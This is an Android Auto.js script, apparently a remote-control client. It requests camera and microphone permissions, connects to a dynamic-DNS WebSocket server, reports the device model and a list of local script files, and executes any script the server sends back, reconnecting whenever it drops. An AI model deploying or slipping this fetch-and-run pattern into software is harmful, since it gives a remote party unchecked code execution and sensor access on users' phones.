importClass(org.java_websocket.client.WebSocketClient);
importClass(org.java_websocket.handshake.ServerHandshake);
importClass(java.net.URI);

let ws = null;

// 请求权限
let permissions = ["android.permission.CAMERA", "android.permission.RECORD_AUDIO"];
runtime.requestPermissions(permissions);

function connectToServer() {
    // 服务器地址
    const serverUrl = 'ws://k2o3.tpddns.cn:20501/ws/' + device.buildId;

    // 创建WebSocket连接
    let serverUri = new URI(serverUrl);
    ws = new WebSocketClient(serverUri) {
        onOpen: function (handshakedata) {
            console.log('Connected to server');
            // 发送设备型号
            this.send(JSON.stringify({ model: device.model }));
            // 发送脚本列表
            const scriptList = files.listDir("/sdcard/脚本/");
            this.send(JSON.stringify({ script_list: scriptList }));
        },

        onMessage: function (message) {
            console.log('Received message: ' + message);
            const data = JSON.parse(message);
            if (data.script) {
                // 执行接收到的脚本
                try {
                    engines.execScript("remote_script", data.script);
                } catch (e) {
                    console.error("Error executing script: " + e);
                }
            }
        },

        onClose: function (code, reason, remote) {
            console.log('Disconnected from server');
            // 尝试重新连接
            setTimeout(connectToServer, 5000);
        },

        onError: function (ex) {
            console.error('WebSocket error: ' + ex);
        },
    };

    ws.connect();
}

// 启动连接
connectToServer();

// 保持脚本运行
setInterval(()=>{}, 1000);
